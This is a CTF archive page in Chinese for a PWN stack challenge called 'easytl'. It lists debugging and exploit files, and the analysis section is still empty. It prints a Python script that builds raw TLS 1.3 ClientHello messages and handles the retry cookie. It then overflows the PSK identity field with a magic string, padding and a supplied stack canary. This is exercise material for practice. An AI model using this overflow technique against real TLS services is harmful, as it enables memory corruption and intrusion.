# 知识点

Stack

# 题目分析

分类：PWN / Stack。

本页按现有附件、脚本和分析记录归档；运行与解题状态见具体记录，整理过程未执行题目或远端脚本。

## 文件

- [canary.gdb](canary.gdb)
- [client.py](client.py)
- [dump.gdb](dump.gdb)
- [dump2.gdb](dump2.gdb)
- [dump3.gdb](dump3.gdb)
- [dump6.gdb](dump6.gdb)
- [easytl](easytl)
- [easytl_2443](easytl_2443)
- [easytl_3443](easytl_3443)
- [easytl_4443](easytl_4443)
- [easytl_5443](easytl_5443)
- [easytl_patched](easytl_patched)
- [exploit.py](exploit.py)
- [hrr_psk.py](hrr_psk.py)
- [leak_test.py](leak_test.py)
- [mc.gdb](mc.gdb)
- [mkport.py](mkport.py)
- [probe.py](probe.py)
- [pwn.py](pwn.py)
- [raw2.py](raw2.py)
- [rawch.py](rawch.py)
- [rawtest.py](rawtest.py)
- [remote_probe.py](remote_probe.py)
- [ropdbg.gdb](ropdbg.gdb)
- [server.crt](server.crt)
- [sni_test.py](sni_test.py)
- [stat.py](stat.py)
- [stat2.py](stat2.py)
- [stat3.py](stat3.py)
- [stat4.py](stat4.py)
- [t1.py](t1.py)
- [t2.py](t2.py)
- [t3.py](t3.py)
- [t4.py](t4.py)
- [t5.py](t5.py)
- [t_canary.py](t_canary.py)
- [t_err.py](t_err.py)
- [t_oracle.py](t_oracle.py)
- [t_time.py](t_time.py)
- [wl10k.txt](wl10k.txt)

尚无可匹配的题解正文，当前保留附件及已有脚本，分析结论待补。

# EXP

- [client.py](client.py)
- [exploit.py](exploit.py)
- [hrr_psk.py](hrr_psk.py)
- [leak_test.py](leak_test.py)
- [mkport.py](mkport.py)
- [probe.py](probe.py)
- [pwn.py](pwn.py)
- [raw2.py](raw2.py)
- [rawch.py](rawch.py)
- [rawtest.py](rawtest.py)
- [remote_probe.py](remote_probe.py)
- [sni_test.py](sni_test.py)
- [stat.py](stat.py)
- [stat2.py](stat2.py)
- [stat3.py](stat3.py)
- [stat4.py](stat4.py)
- [t1.py](t1.py)
- [t2.py](t2.py)
- [t3.py](t3.py)
- [t4.py](t4.py)
- [t5.py](t5.py)
- [t_canary.py](t_canary.py)
- [t_err.py](t_err.py)
- [t_oracle.py](t_oracle.py)
- [t_time.py](t_time.py)

脚本按已有材料保留，使用前核对目标程序、运行库和参数。公开副本中的历史服务地址已替换，需自行设置。

```python
import socket, struct, os, sys, time

MAGIC = b"1401518dc5d7641ccd41593a5d812410"


def ext(t, data):
    return struct.pack("!HH", t, len(data)) + data


def build_ch(sni, identity=None, key_share=b"\x00" * 32, cookie=None):
    rand = os.urandom(32)
    sid = os.urandom(32)
    exts = b""
    name = sni.encode() if isinstance(sni, str) else sni
    sn = b"\x00" + struct.pack("!H", len(name)) + name
    exts += ext(0, struct.pack("!H", len(sn)) + sn)
    exts += ext(10, struct.pack("!H", 2) + struct.pack("!H", 0x001D))
    sigs = struct.pack("!H", 10) + b"".join(struct.pack("!H", x) for x in (0x0804, 0x0403, 0x0503, 0x0401, 0x0201))
    exts += ext(13, sigs)
    exts += ext(43, b"\x02\x03\x04")
    if cookie is not None:
        exts += ext(44, struct.pack("!H", len(cookie)) + cookie)
    if key_share is None:
        exts += ext(51, b"\x00\x00")
    else:
        entry = struct.pack("!H", 0x001D) + struct.pack("!H", len(key_share)) + key_share
        exts += ext(51, struct.pack("!H", len(entry)) + entry)
    if identity is not None:
        exts += ext(45, b"\x01\x01")
        ident = struct.pack("!H", len(identity)) + identity + struct.pack("!I", 0)
        binders = b"\x30" + b"\x00" * 48
        exts += ext(41, struct.pack("!H", len(ident)) + ident + struct.pack("!H", len(binders)) + binders)
    body = (b"\x03\x03" + rand + bytes([len(sid)]) + sid + b"\x00\x02\x13\x02" + b"\x01\x00" +
            struct.pack("!H", len(exts)) + exts)
    return b"\x01" + struct.pack("!I", len(body))[1:] + body


def send_hs(s, hs):
    s.sendall(b"\x16\x03\x01" + struct.pack("!H", len(hs)) + hs)


def read_some(s, t=1.5):
    s.settimeout(t)
    out = b""
    try:
        while True:
            b = s.recv(4096)
            if not b:
                break
            out += b
    except Exception:
        pass
    return out


def hrr_cookie(rec):
    if len(rec) < 5 or rec[0] != 0x16:
        return None
    p = 5
    ln = int.from_bytes(rec[p + 1:p + 4], "big")
    hs = rec[p + 4:p + 4 + ln]
    random = hs[2:34]
    HRR = bytes.fromhex("cf21ad74e59a6111be1d8c021e65b891c2a211167abb8c5e079e09e2c8a8339c")
    if random != HRR:
        return False
    sid_len = hs[34]
    q = 35 + sid_len + 2 + 1
    elen = int.from_bytes(hs[q:q + 2], "big")
    exts = hs[q + 2:q + 2 + elen]
    i = 0
    cookie = None
    while i + 4 <= len(exts):
        et = int.from_bytes(exts[i:i + 2], "big")
        el = int.from_bytes(exts[i + 2:i + 4], "big")
        if et == 44:
            cookie = exts[i + 6:i + 4 + el]
        i += 4 + el
    return cookie


def attempt(host, port, sni, identity, extra_wait=1.2):
    """returns bytes received after the triggering alert"""
    try:
        s = socket.create_connection((host, port), timeout=6)
    except Exception as e:
        return b"CONNFAIL"
    try:
        send_hs(s, build_ch(sni, identity=None, key_share=None))
        rec = read_some(s, 1.5)
        ck = hrr_cookie(rec)
        if ck is False or ck is None and len(rec) < 10:
            s.close(); return b"NOHRR"
        send_hs(s, build_ch(sni, identity=identity, cookie=ck))
        r2 = read_some(s, 1.2)
        try:
            s.sendall(bytes([0x15, 0x03, 0x03, 0x00, 0x02, 0x01, 0x00]))
        except Exception:
            pass
        r3 = read_some(s, extra_wait)
        s.close()
        return r2 + b"|" + r3
    except Exception as e:
        try: s.close()
        except Exception: pass
        return b"EXC"


def make_sni(n):
    """valid hostname of exactly n chars (labels <= 63)"""
    tail = ".example.com"
    need = n - len(tail)
    assert need >= 1
    labels = []
    while need > 0:
        take = min(63, need)
        # leave room for dots
        if need - take == 0:
            labels.append("a" * take)
            need = 0
        else:
            labels.append("a" * take)
            need -= take + 1
            if need < 0:
                labels[-1] = "a" * (take + need)
                need = 0
    return ".".join(labels) + tail


if __name__ == "__main__":
    host = sys.argv[1]; port = int(sys.argv[2])
    sni = sys.argv[3]
    canary_hex = sys.argv[4] if len(sys.argv) > 4 else "00" * 8
    canary = struct.pack("<Q", int(canary_hex, 16))
    blob = bytearray(MAGIC + b"\x00" + b"F" * (0x58 - 33) + canary)
    print("blob len", len(blob))
    r = attempt(host, port, sni, bytes(blob))
    print("resp:", r[:80])
```
